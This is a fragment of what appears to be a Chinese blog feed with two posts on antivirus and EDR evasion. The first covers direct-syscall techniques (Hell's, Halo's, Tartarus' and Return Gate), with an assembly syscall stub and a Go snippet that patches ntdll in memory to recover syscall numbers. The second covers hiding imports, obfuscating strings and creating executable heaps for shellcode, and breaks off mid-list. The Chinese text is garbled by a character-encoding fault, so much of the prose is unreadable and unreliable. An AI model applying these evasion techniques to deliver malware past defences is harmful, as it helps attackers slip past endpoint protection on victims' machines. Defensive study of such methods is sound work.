src="https://s2.loli.net/2022/11/09/Pe8JtUjiFf6uQXb.png"></p><p>ä½¿ç”¨è¿™äº›ä¿æŠ¤ç¯å¯ä»¥ç¡®ä¿åº”ç”¨ç¨‹åºæ˜¯éš”ç¦»çš„ï¼Œå¹¶ä¸”ä¸èƒ½ç›´æ¥è®¿é—®åœ¨ å†…æ ¸æ¨¡å¼ä¸‹è¿è¡Œçš„å…³é”®å†…å­˜éƒ¨åˆ†å’Œç³»ç»Ÿèµ„æºã€‚å½“åº”ç”¨ç¨‹åºéœ€è¦æ‰§è¡Œç‰¹æƒç³»ç»Ÿæ“ä½œæ—¶ï¼Œå¤„ç†å™¨é¦–å…ˆéœ€è¦åˆ‡æ¢åˆ° ring 0 ä»¥å°†æ‰§è¡Œæµç¨‹åˆ‡æ¢åˆ° kernel-modeã€‚è¿™æ˜¯ ç³»ç»Ÿè°ƒç”¨åˆ°ä½çš„åœ°æ–¹ã€‚</p><p>ä¾‹å¦‚æˆ‘ä»¬å°†æ–‡ä»¶ä¿å­˜åœ¨ç£ç›˜ä¸Šçš„è¿™ä¸ªæ“ä½œï¼Œæ“ä½œç³»ç»Ÿéœ€è¦è®¿é—®æ–‡ä»¶ç³»ç»Ÿå’Œè®¾å¤‡é©±åŠ¨ç¨‹åºã€‚è¿™äº›æ˜¯ç‰¹æƒæ“ä½œï¼Œä¸åº”å…è®¸åº”ç”¨ç¨‹åºæœ¬èº«æ‰§è¡Œã€‚ç›´æ¥ä»åº”ç”¨ç¨‹åºè®¿é—®è®¾å¤‡é©±åŠ¨ç¨‹åºå¯èƒ½ä¼šå¯¼è‡´éå¸¸ç³Ÿç³•çš„äº‹æƒ…ã€‚å› æ­¤ï¼Œè¿›å…¥å†…æ ¸æ¨¡å¼ä¹‹å‰çš„æœ€åä¸€ä¸ª API è°ƒç”¨è´Ÿè´£å°† dip å¼€å…³æ‹‰å…¥å†…æ ¸åŒºåŸŸã€‚</p><p>å› æ­¤è®¸å¤šAVçš„hookéƒ½ä¼šæ”¾åœ¨è¿™é‡Œï¼Œè¿™æ ·ä»–ä»¬å°±å¯ä»¥ç»•è¿‡æ‰§è¡Œæµç¨‹ï¼Œç›´æ¥è¿›å…¥å¼•æ“ï¼Œæ¥ç›‘æ§å¯ç–‘è¡Œä¸ºå¹¶æ‹¦æˆªAPIè°ƒç”¨<br>æ‰€ä»¥æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯ç›´æ¥æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ¥ç»•è¿‡Windowså’ŒNative APIï¼Œè¿™æ ·å°±èƒ½ç»•è¿‡ç”¨æˆ·æ¨¡å¼çš„hook</p><h3 id="åœ°ç‹±ä¹‹é—¨çš„å®ç°"><a href="#åœ°ç‹±ä¹‹é—¨çš„å®ç°" class="headerlink" title="åœ°ç‹±ä¹‹é—¨çš„å®ç°"></a>åœ°ç‹±ä¹‹é—¨çš„å®ç°</h3><p>â€œåœ°ç‹±ä¹‹é—¨â€æ˜¯@am0nsec å’Œ@RtlMateusz åœ¨æœ¬æ–‡ä¸­åˆ›é€ çš„ä¸€ä¸ªæœ¯è¯­ï¼š<br><a href="https://vxug.fakedoma.in/papers/VXUG/Exclusive/HellsGate.pdf">Hellâ€™s Gate</a><br>å…¶åŸºæœ¬æ¦‚å¿µæ˜¯é€šè¿‡è¯»å– ntdll.dll åœ¨ä¸»æœºä¸ŠåŠ¨æ€æ‰¾åˆ°ç³»ç»Ÿè°ƒç”¨ï¼Œç„¶åä»æ‚¨è‡ªå·±çš„è‡ªå®šä¹‰å®ç°ä¸­è°ƒç”¨å®ƒä»¬ã€‚<br>å°†ç°æœ‰ä»£ç è½¬æ¢ä¸ºç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯å¼„æ¸…æ¥šåº•å±‚ç³»ç»Ÿè°ƒç”¨æ˜¯ä»€ä¹ˆ</p><p>æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ç³»ç»Ÿè°ƒç”¨æ“ä½œç å¹¶å°†æˆ‘ä»¬çš„è‡ªå®šä¹‰å‡½æ•°æŒ‡å‘å®ƒä»¬</p><ol><li>é¦–å…ˆï¼Œæˆ‘ä»¬çš„å‡½æ•°è¢«åˆ†é…ç»™ä¸€ä¸ªæ•°ç»„ï¼Œæˆ‘ä»¬å°†ç”¨ä» ntdll å¤åˆ¶çš„æ“ä½œç å¡«å……è¯¥æ•°ç»„ã€‚<br><img src="https://s2.loli.net/2022/11/09/YwdaC6h42eKxGkB.png"><br><img src="https://s2.loli.net/2022/11/09/PVpS9MEzX4QaDbq.png"></li><li>è°ƒç”¨æ–°çš„è‡ªå®šä¹‰å‡½æ•°ï¼Œå°±å¦‚åŒæˆ‘ä»¬åœ¨è°ƒç”¨æ™®é€šå‡½æ•°ä¸€æ ·<br>ä¾‹å¦‚è¿™ä¸ªæ–°å®ç°çš„<code>NtOpenProcess</code>å‡½æ•°ï¼Œè¿™æ¯”åŸæ¥çš„OpenProcesså¤æ‚å¾—å¤šï¼Œè¿™æ ·å°±èƒ½è§„é¿æ‰å¸¸è§çš„APIç”¨æˆ·æ€hook<br><img src="https://s2.loli.net/2022/11/09/kXe5WZftBsoMP1D.png" alt="NtOpenProcess"></li></ol><h1 id="Haloâ€™s-Gate"><a href="#Haloâ€™s-Gate" class="headerlink" title="Haloâ€™s Gate"></a>Haloâ€™s Gate</h1><h2 id="å…‰ç¯ä¹‹é—¨"><a href="#å…‰ç¯ä¹‹é—¨" class="headerlink" title="å…‰ç¯ä¹‹é—¨"></a>å…‰ç¯ä¹‹é—¨</h2><p>å¯¹äºHellâ€™s Gateè€Œè¨€,æœ€åˆæ˜¯ä¸€ç§éå¸¸æœ‰åˆ›æ„çš„æ–¹æ³•ï¼Œé€šè¿‡ä»PEBç»“æ„ä¸­è§£æ InMemoryOrderModuleLIst æ¥è·å–ç³»ç»Ÿè°ƒç”¨ç¼–å·ã€‚é€šè¿‡æ‰¾åˆ° ntdll.dll åœ°å€ï¼ˆé€šå¸¸æ˜¯ InMemoryOrderModuleLIst ä¸­çš„ç¬¬ä¸€ä¸ªæ¡ç›®ï¼‰ï¼Œå¯ä»¥é€šè¿‡è§£æå…¶å¯¼å‡ºä»¥è·å–æˆ‘ä»¬éœ€è¦çš„å¿…è¦å‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨ç¼–å·ã€‚</p><p>è€ŒHaloâ€™s Gateæ˜¯ä¸€ç§åŸºäºHellâ€™s Gateçš„æ–°æŠ€æœ¯ï¼Œç”¨äºè§£å¼€WINAPIè°ƒç”¨<br>Haloâ€™s Gate åŸºæœ¬ä¸Šæ£€æŸ¥è¢«è°ƒç”¨çš„ WINAPI çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œå¦‚æœå®ƒä»¬åº”è¯¥æ˜¯â€œ4c8bd1b8â€ï¼Œé‚£ä¹ˆ WINAPI æ²¡æœ‰è¢«é’©ä½ï¼Œä¸€åˆ‡æ­£å¸¸è¿›è¡Œï¼Œä½†æ˜¯å½“ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯â€œe9â€æ—¶ï¼Œjmp æ±‡ç¼–æŒ‡ä»¤é‡å®šå‘ç¨‹åºæ‰§è¡Œåˆ° AV/EDR æ£€æŸ¥å¼•æ“ï¼Œå› æ­¤å®ƒè¢«hookäº†<br><img src="https://s2.loli.net/2022/11/09/LpQ2uSaWA4mIzvs.png"><br>å¦‚æœå­—èŠ‚æ˜¯â€œe9â€ï¼ŒHaloâ€™s Gate è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œé€šè¿‡å‘ä¸Šæˆ–å‘ä¸‹æ£€æŸ¥ä¸‹ä¸€ä¸ªæˆ–ä¸Šä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚æœå®ƒæ²¡æœ‰è¢«hookï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠ“ä½ç³»ç»Ÿè°ƒç”¨å¹¶æ·»åŠ  +1 å­—èŠ‚ï¼Œå› ä¸ºå®ƒä»¬éƒ½æ˜¯æœ‰åºçš„ã€‚</p><h1 id="Tartarusâ€™-Gate"><a href="#Tartarusâ€™-Gate" class="headerlink" title="Tartarusâ€™ Gate"></a>Tartarusâ€™ Gate</h1><h2 id="å…‰ç¯ä¹‹é—¨çš„è¿›åŒ–"><a href="#å…‰ç¯ä¹‹é—¨çš„è¿›åŒ–" class="headerlink" title="å…‰ç¯ä¹‹é—¨çš„è¿›åŒ–"></a>å…‰ç¯ä¹‹é—¨çš„è¿›åŒ–</h2><p>Haloâ€™s Gateå¹¶ä¹Ÿä¸æ˜¯ä¸‡èƒ½çš„ï¼Œå› ä¸ºå¹¶ä¸æ˜¯æ‰€æœ‰EDRéƒ½ä»¥ç›¸åŒçš„æ–¹å¼è¿æ¥ï¼Œæ‰€æœ‰æˆ‘ä»¬å¿…é¡»ç»•è¿‡ï¼Œå¹¶å°†å…¶ä¼˜åŒ–ï¼Œåœ¨EDRä¸­ï¼Œå¾ˆæ˜¾ç„¶ï¼Œå®ƒä»¥å­—èŠ‚â€œ4c8bd1e9â€å¼€å¤´<br><img src="https://s2.loli.net/2022/11/09/oMpuabB7XqtCFDI.png" alt="å½“WINAPIè°ƒç”¨è¢«æŒ‚èµ·æ—¶"><br>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¢åŠ ä¸€ä¸ªæ£€æŸ¥ï¼Œæ£€æŸ¥ç¬¬å››ä¸ªå­—èŠ‚æ˜¯å¦æ˜¯<code>e9</code>ï¼Œå¦‚æœæ˜¯ï¼Œé‚£ä¹ˆå®ƒå°†æŒ‰ç…§Haloâ€™s Gateè§£å¼€æ¥ç»•è¿‡EDR<br><a href="https://github.com/trickster0/TartarusGate">é¡¹ç›®åœ°å€</a></p><h1 id="Return-Gate"><a href="#Return-Gate" class="headerlink" title="Return Gate"></a>Return Gate</h1><h2 id="è¿”ç¨‹é—¨"><a href="#è¿”ç¨‹é—¨" class="headerlink" title="è¿”ç¨‹é—¨"></a>è¿”ç¨‹é—¨</h2><p>åœ°ç‹±ä¹‹é—¨å¸¦ä½ ä¸‹åœ°ç‹±ï¼Œè¿”ç¨‹ä¹‹é—¨å¸¦sysidå›å®¶</p><p>å¯¹äºç»å¤§å¤šæ•°çš„ç›´æ¥ç³»ç»Ÿè°ƒç”¨çš„é¡¹ç›®è€Œè¨€ï¼Œå…¶æ ¸å¿ƒæ“ä½œå¯ä»¥åˆ†ä¸ºä¸¤éƒ¨åˆ†</p><ol><li>ç»•è¿‡EDRç›‘æ§è·å–sysid</li><li>ä½¿ç”¨sysidç»•è¿‡EDRç›‘æ§è°ƒç”¨nt api</li></ol><p>å¯¹äºNT APIçš„è°ƒç”¨</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r10</span>,<span class="hljs-built_in">rcx</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>,xxh<br><span class="hljs-keyword">syscall</span><br><span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>å› ä¸ºå½“å…¶åœ¨ä¼ å…¥ eax å¯„å­˜å™¨çš„å€¼ä¸åŒï¼Œå­˜å‚¨çš„æ˜¯ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³sysidï¼Œä¸åŒè°ƒç”¨å·é’ˆå¯¹syscall è¿›å…¥å†…æ ¸è°ƒç”¨çš„ä¸åŒçš„å†…æ ¸å‡½æ•°ã€‚<br>è€Œå¯¹äºr3å±‚çš„edr hookæ¥è¯´ï¼Œä¼šåœ¨apiåœ°å€çš„å‰æ®µåŠ å…¥inline hook<br>è¿™æ ·åœ¨è¿›è¡ŒAPIè°ƒç”¨çš„æ—¶å€™å°±ä¼šå¼ºåˆ¶è·³è½¬åˆ°ä¸€ä¸ªåœ°å€ï¼Œå³ä¸ºEDRçš„æ¢é’ˆã€‚<br>è€Œè¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆå¥½çš„é¡¹ç›®ï¼ŒåŒ…æ‹¬å‚æ•°æ¬ºéª—å’Œç³»ç»Ÿè°ƒç”¨æ£€ç´¢ã€‚ä»–ä»¬éƒ½æ»¥ç”¨EHæ¥ç ´åEDR<br><a href="https://github.com/rad9800/TamperingSyscalls">TamperingSyscalls</a></p><h2 id="Return-Gateå®ç°"><a href="#Return-Gateå®ç°" class="headerlink" title="Return Gateå®ç°"></a>Return Gateå®ç°</h2><p>æˆ‘ä»¬å·²ç»çŸ¥é“äº†</p><ol><li>EDR hookå¤§éƒ¨åˆ†ä¸ä¼šå½±å“åˆ°syscall;retæŒ‡ä»¤ã€‚</li><li>åœ¨æ‰§è¡ŒsyscallæŒ‡ä»¤æ—¶sysidä½äºeaxå¯„å­˜å™¨ä¸­ã€‚</li><li>ä½¿ç”¨ç©ºå‚æ•°è°ƒç”¨apiè¢«è®°å½•åˆ°çš„æ¶æ„ç¨‹åº¦è¾ƒä½ã€‚</li><li>éƒ¨åˆ†EDRä¼šç›‘æ§è‡ªå·±çš„é’©å­æ˜¯å¦è¢«è„±é’©ã€‚<br>æ‰€ä»¥ret æŒ‡ä»¤ä¼šå°†eaxå¯„å­˜å™¨çš„å€¼è¿”å›ã€‚</li></ol><p>é‚£ä¹ˆï¼Œå°±æœ‰äº†ä¸€ä¸ªè·å–sysidçš„æ–°æ‰‹æ®µï¼Œä½¿ç”¨writeprocessmemoryå°†Nt APIçš„syscallæŒ‡ä»¤ä¿®æ”¹ä¸ºnopï¼Œå†ä½¿ç”¨ç©ºå‚æ•°è°ƒç”¨api, è¿”å›å€¼å³ä¸ºè¯¥apiçš„sysidï¼Œé¡¹ç›®ç”¨Goå®ç°äº†ä¸€æ®µPOC<br><a href="https://github.com/timwhitez/ReturnGate">é¡¹ç›®åœ°å€</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs Go">replace:= []<span class="hljs-keyword">byte</span>&#123;<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>&#125;<br>raw:= []<span class="hljs-keyword">byte</span>&#123;<span class="hljs-number">0x0f</span>,<span class="hljs-number">0x05</span>&#125;<br><br><span class="hljs-comment">//è·å–åœ°å€</span><br>apiName := <span class="hljs-string">&quot;NtReadVirtualMemory&quot;</span><br>nt := syscall.NewLazyDLL(<span class="hljs-string">&quot;ntdll&quot;</span>).NewProc(apiName).Addr()<br><br><span class="hljs-comment">//æ›¿æ¢</span><br><span class="hljs-keyword">if</span> *(*<span class="hljs-keyword">byte</span>)(unsafe.Pointer(nt+<span class="hljs-number">18</span>)) == <span class="hljs-number">0x0f</span> &amp;&amp;<br>*(*<span class="hljs-keyword">byte</span>)(unsafe.Pointer(nt+<span class="hljs-number">19</span>)) == <span class="hljs-number">0x05</span> &amp;&amp;<br>*(*<span class="hljs-keyword">byte</span>)(unsafe.Pointer(nt+<span class="hljs-number">20</span>)) == <span class="hljs-number">0xc3</span>&#123;<br>windows.WriteProcessMemory(<span class="hljs-number">0xffffffffffffffff</span>,nt+<span class="hljs-number">18</span>,(*<span class="hljs-keyword">byte</span>)(unsafe.Pointer(&amp;replace[<span class="hljs-number">0</span>])),<span class="hljs-number">2</span>,<span class="hljs-literal">nil</span>)<br>&#125;<br><br><span class="hljs-comment">//ç©ºè°ƒç”¨è·å–sysid</span><br>sysid,_,_ := syscall.Syscall(nt,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>fmt.Printf(<span class="hljs-string">&quot;sysid: %d\n\n&quot;</span>,sysid)<br><br><span class="hljs-comment">//æ¢å¤</span><br>windows.WriteProcessMemory(<span class="hljs-number">0xffffffffffffffff</span>,nt+<span class="hljs-number">18</span>,(*<span class="hljs-keyword">byte</span>)(unsafe.Pointer(&amp;raw[<span class="hljs-number">0</span>])),<span class="hljs-number">2</span>,<span class="hljs-literal">nil</span>)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å…æ€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é™æ€æ¶æ„ä»£ç é€ƒé€¸3</title>
      <link href="2022/10/20/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B83/"/>
      <url>2022/10/20/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B83/</url>
      
        <content type="html"><![CDATA[<h1 id="é™æ€æ¶æ„ä»£ç é€ƒé€¸3"><a href="#é™æ€æ¶æ„ä»£ç é€ƒé€¸3" class="headerlink" title="é™æ€æ¶æ„ä»£ç é€ƒé€¸3"></a>é™æ€æ¶æ„ä»£ç é€ƒé€¸3</h1><p>æœ€è¿‘åœ¨å­¦ä¹ ä»åº•å±‚ç”¨C/C++å»å®ç°å…æ€ï¼Œè€Œçœ‹åˆ°äº†å…³äºé™æ€æ¶æ„ä»£ç é€ƒé€¸çš„ä¸€äº›å¾ˆå¥½çš„æ–‡ç« ï¼Œåœ¨æ­¤è®°å½•æ€»ç»“ä¸€ä¸‹</p><a id="more"></a><h3 id="è°ƒç”¨è‡ªå·±å‡½æ•°éšè—å¯¼å…¥è¡¨"><a href="#è°ƒç”¨è‡ªå·±å‡½æ•°éšè—å¯¼å…¥è¡¨" class="headerlink" title="è°ƒç”¨è‡ªå·±å‡½æ•°éšè—å¯¼å…¥è¡¨"></a>è°ƒç”¨è‡ªå·±å‡½æ•°éšè—å¯¼å…¥è¡¨</h3><h4 id="Import-Address-Tableï¼ˆIATï¼‰"><a href="#Import-Address-Tableï¼ˆIATï¼‰" class="headerlink" title="Import Address Tableï¼ˆIATï¼‰"></a>Import Address Tableï¼ˆIATï¼‰</h4><p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å¯¹äºPEæ–‡ä»¶çš„ç»“æ„æœ‰äº†ä¸€å®šçš„äº†è§£<br>è€ŒPEæ–‡ä»¶çš„å¯¼å…¥è¡¨(IAT)å°†è°ƒç”¨å¯¼å…¥å‡½æ•°çš„æŒ‡ä»¤å’Œå‡½æ•°å®é™…æ‰€å¤„çš„åœ°å€è”ç³»èµ·æ¥(åŠ¨æ€è¿æ¥)<br>è§è€Œè¨€ä¹‹å°±æ˜¯PEåˆ©ç”¨å¯¼å…¥è¡¨æ¥æ‰¾å¤–éƒ¨å‡½æ•°åœ°å€</p><p>è¿™é‡Œæ²¡æ‰¾åˆ°åŸæ–‡ä¸­çš„å·¥å…·ï¼Œäºæ˜¯è‡ªå·±æ‰¾äº†ä¸€ä¸ªå·¥å…·,ç”¨æ¥æŸ¥çœ‹ç¨‹åºä¸­çš„å¯¼å…¥è¡¨<br><a href="https://github.com/oxiKKK/iat-dump">IAT-dump</a></p><p>å¯¹äºè¿™ä¸ªå·¥å…·ï¼Œä¹Ÿå¯èƒ½æ˜¯è‡ªå·±æ²¡æ€ä¹ˆæ¥è§¦è¿‡C++20ï¼Œäºæ˜¯æŠ˜è…¾äº†æŒºä¹…æ‰è·‘èµ·æ¥</p><p>æ ¹æ®main.cppä¸­çš„è¿™ä¸€æ®µä»£ç å¯ä»¥çŸ¥é“ï¼Œéœ€è¦æˆ‘ä»¬ä¼ ä¸€ç‚¹å‚æ•°è¿›å»<br><img src="https://s2.loli.net/2022/10/20/RMhZQGt4ijUYedr.png" alt="main.cpp"></p><p>è€Œå¯¹äºmainå‡½æ•°ä¸­ä¼ é€’å‚æ•°<code>int main(int argc, char** argv)</code><br>å…¶ä¸­argcè®°å½•çš„æ˜¯å‚æ•°çš„ä¸ªæ•°ï¼Œargvåˆ™æ˜¯æŒ‰é¡ºåºå­˜å‚¨äº†ä¼ å…¥çš„å‚æ•°</p><p>é‚£æˆ‘ä»¬ç¬¬ä¸€æ­¥å…ˆå°†è°ƒè¯•æ¨¡å¼æ”¹æˆreleaseï¼Œè¿™æ ·ç¼–è¯‘åä¼šå­˜åœ¨ä¸€ä¸ªiat-dump.exe<br><code> .\iat-dump.exe -file evil.exe</code><br>è¿™æ ·å³å¯æŸ¥çœ‹evil.exeçš„å¯¼å…¥è¡¨ï¼ˆevil.exeå¾—åœ¨å½“å‰ç›®å½•ä¸‹ï¼‰<br><img src="https://s2.loli.net/2022/10/20/GxKI6VnmOcD9WAL.png"></p><p><em>åœ¨æ‰¾å·¥å…·çš„æ—¶å€™ï¼Œä¹Ÿå‘ç°äº†ä¸€ä¸ªæ¯”è¾ƒå¥½ç©çš„ä¸œè¥¿ï¼Œä¸è¿‡è¿˜æ²¡ä»”ç»†å»çœ‹ï¼Œå…ˆè®°å½•ä¸€ä¸‹ <a href="https://github.com/fdgnneig/ShellProgram">https://github.com/fdgnneig/ShellProgram</a></em></p><h4 id="è·å–å‡½æ•°åœ°å€"><a href="#è·å–å‡½æ•°åœ°å€" class="headerlink" title="è·å–å‡½æ•°åœ°å€"></a>è·å–å‡½æ•°åœ°å€</h4><p>è¿™ä¸ªAPIåœ¨Kernel32.dllä¸­æœ‰ä¸€ä¸ªå‡½æ•°<code>GetProcAddress</code>è¢«å¯¼å‡ºï¼Œä¸»è¦åŠŸèƒ½æ˜¯ä»ä¸€ä¸ªåŠ è½½çš„æ¨¡å—ä¸­è·å–å‡½æ•°çš„åœ°å€<br>å…¶èƒ½è¿”å›ä¸€ä¸ªæˆ‘ä»¬éœ€è¦æ‰¾çš„å‡½æ•°çš„åœ°å€ï¼Œæˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ¥è‡ªå·±æ‰‹åŠ¨è·å–å‡½æ•°åœ°å€ï¼Œè¿™æ ·å°±ä¸ä¼šä½¿å±é™©çš„å‡½æ•°å‡ºç°åœ¨IATä¸­<br>å› ä¸ºæ€è½¯ä¼šå¯¹å¯¼å…¥è¡¨ä¸­çš„æŸäº›å‡½æ•°ï¼ˆä¾‹å¦‚VirtualAllocå‡½æ•°åŸºäºå¯æ‰§è¡Œæƒé™æ—¶ï¼Œä¼šç›´æ¥æŠ¥æ¯’æŸ¥æ€ï¼‰ç‰¹åˆ«å…³æ³¨</p><p>æˆ‘ä»¬å®šä¹‰ä¸€äº›å‡½æ•°æŒ‡é’ˆæ¥å­˜æ”¾å‡½æ•°çš„åœ°å€<br><code>ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(&quot;kernel32.dll&quot;)), &quot;VirtualAlloc&quot;);</code></p><p>ç¼–è¯‘é€šè¿‡åï¼Œè‡ªå®šä¹‰çš„å‡½æ•°æ—¶ä¸ä¼šå‡ºç°åœ¨å¯¼å…¥è¡¨ä¸­çš„ï¼Œè¿™æ ·å°±å‡å°‘äº†æ–‡ä»¶ç‰¹å¾</p><h3 id="é‡è½½è¿ç®—ç¬¦"><a href="#é‡è½½è¿ç®—ç¬¦" class="headerlink" title="é‡è½½è¿ç®—ç¬¦"></a>é‡è½½è¿ç®—ç¬¦</h3><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒC/C++ç¨‹åºä¸­çš„å­—ç¬¦ä¸²å¸¸é‡ä¼šè¢«ç¡¬ç¼–ç åˆ°ç¨‹åºä¸­ï¼ˆ.dataæ®µï¼Œä¹Ÿå°±æ˜¯æ•°æ®æ®µï¼‰ï¼Œå°¤å…¶æ˜¯å…¨å±€å˜é‡æœ€å®¹æ˜“è¢«å®šä½åˆ°<br>äºæ˜¯æƒ³åˆ°ä½¿ç”¨é‡è½½è¿ç®—ç¬¦æ¥å°†stringé‡è½½ï¼Œå†è¿›è¡Œç¼–ç ç­‰ä¸€ç³»åˆ—æ“ä½œ<br>è¿™é‡Œæœ‰ä¸ªé¡¹ç›®å·²ç»å®ç°äº†ï¼Œé‡è½½è¿ç®—ç¬¦çš„åŸç†æ¯”è¾ƒå®¹æ˜“ç†è§£ï¼Œå°±ä¸åšå¤šå™è¿°äº†<br><a href="https://github.com/Rvn0xsy/Cooolis-ms">https://github.com/Rvn0xsy/Cooolis-ms</a></p><h3 id="ç»•è¿‡DEP"><a href="#ç»•è¿‡DEP" class="headerlink" title="ç»•è¿‡DEP"></a>ç»•è¿‡DEP</h3><h4 id="ä»€ä¹ˆæ˜¯DEP"><a href="#ä»€ä¹ˆæ˜¯DEP" class="headerlink" title="ä»€ä¹ˆæ˜¯DEP"></a>ä»€ä¹ˆæ˜¯DEP</h4><p>åœ¨Windows Xp SP2 ä¹‹å‰çš„æ—¶ä»£ï¼Œç¼“å†²åŒºæº¢å‡ºæ¼æ´åˆ©ç”¨é—¨æ§›å¤ªä½äº†ï¼Œåªè¦å‘ç°æœ‰ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œå°±å¯ä»¥ç›´æ¥ç¨³å®šåˆ©ç”¨ï¼Œæ”»å‡»è€…åªéœ€è¦å°†Shellcodeä¸æ–­å†™å…¥å †æ ˆï¼Œç„¶åè¦†ç›–å‡½æ•°è¿”å›åœ°å€ï¼Œä»£ç å°±å¯ä»¥åœ¨å †æ ˆä¸­æ‰§è¡Œã€‚ä½†å †æ ˆçš„ç”¨é€”ä¸»è¦æ˜¯ä¿å­˜å¯„å­˜å™¨ç°åœºï¼Œæä¾›ä¸€ä¸ªå‡½æ•°è¿è¡Œæ—¶çš„å­˜å‚¨ç©ºé—´ï¼Œæå°‘æ•°éœ€è¦ä»£ç åœ¨å †æ ˆä¸­æ‰§è¡Œï¼Œäºæ˜¯å¾®è½¯ä¸ºäº†ç¼“è§£ç±»ä¼¼çš„æƒ…å†µï¼Œå‘æ˜äº†DEPä¿æŠ¤æœºåˆ¶ï¼Œç”¨äºé™åˆ¶æŸäº›å†…å­˜é¡µä¸å…·æœ‰å¯æ‰§è¡Œæƒé™</p><h4 id="ç»•è¿‡DEP-1"><a href="#ç»•è¿‡DEP-1" class="headerlink" title="ç»•è¿‡DEP"></a>ç»•è¿‡DEP</h4><p>VirtualProtectè¿™ä¸ªAPIèƒ½å¤Ÿæ›´æ”¹å†…å­˜é¡µçš„å±æ€§ä¸ºå¯æ‰§è¡Œæˆ–ä¸å¯æ‰§è¡Œï¼Œå¯¹äºäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨æ¥è¯´ï¼Œæº¢å‡ºçš„æ—¶å€™ï¼ŒæŠŠè¿”å›åœ°å€è®¾è®¡ä¸ºVirtualProtectçš„åœ°å€ï¼Œå†ç²¾å¿ƒæ„é€ ä¸€ä¸ªæ ˆä¸ºè°ƒç”¨è¿™ä¸ªAPIçš„æ ˆï¼Œå°±å¯ä»¥æ”¹å˜å½“å‰æ ˆçš„å†…å­˜é¡µçš„å±æ€§ï¼Œä½¿å…¶ä»â€ä¸å¯æ‰§è¡Œâ€å˜æˆâ€å¯æ‰§è¡Œâ€<br>ç”±æ­¤è¯´æ¥ï¼ŒShellcodeæ‰§è¡Œå…¶å®ä¹Ÿéœ€è¦ä¸€ä¸ªå¯æ‰§è¡Œçš„å†…å­˜é¡µï¼Œ<br>äºæ˜¯æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªAPI  HeapCreateå¯ä»¥åœ¨è¿›ç¨‹ä¸­åˆ›å»ºè¾…åŠ©å †æ ˆï¼Œå¹¶ä¸”èƒ½å¤Ÿè®¾ç½®å †æ ˆçš„å±æ€§</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HANDLE WINAPI <span class="hljs-title">HeapCreate</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">__in DWORD flOptions,</span></span><br><span class="hljs-function"><span class="hljs-params">__in SIZE_T dwInitialSize,</span></span><br><span class="hljs-function"><span class="hljs-params">__in SIZE_T dwMaximumSize )</span></span>;<br></code></pre></td></tr></table></figure><p>å¯¹äºç¬¬ä¸€ä¸ªå‚æ•°</p><ol><li>HEAP_NO_SERIALIZEï¼šå¯¹å †çš„è®¿é—®æ˜¯éç‹¬å çš„ï¼Œå¦‚æœä¸€ä¸ªçº¿ç¨‹æ²¡æœ‰å®Œæˆå¯¹å †çš„æ“ä½œï¼Œå…¶å®ƒçº¿ç¨‹ä¹Ÿå¯ä»¥è¿›ç¨‹å †æ“ä½œï¼Œè¿™ä¸ªå¼€å…³æ˜¯éå¸¸å±é™©çš„ï¼Œåº”å°½é‡é¿å…ä½¿ç”¨</li><li>HEAP_GENERATE_EXCEPTIONSï¼šå½“å †åˆ†é…å†…å­˜å¤±è´¥æ—¶ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ã€‚å¦‚æœä¸è®¾ç½®ï¼Œåˆ™è¿”å›NULL</li><li>HEAP_CREATE_ENALBE_EXECUTEï¼šå 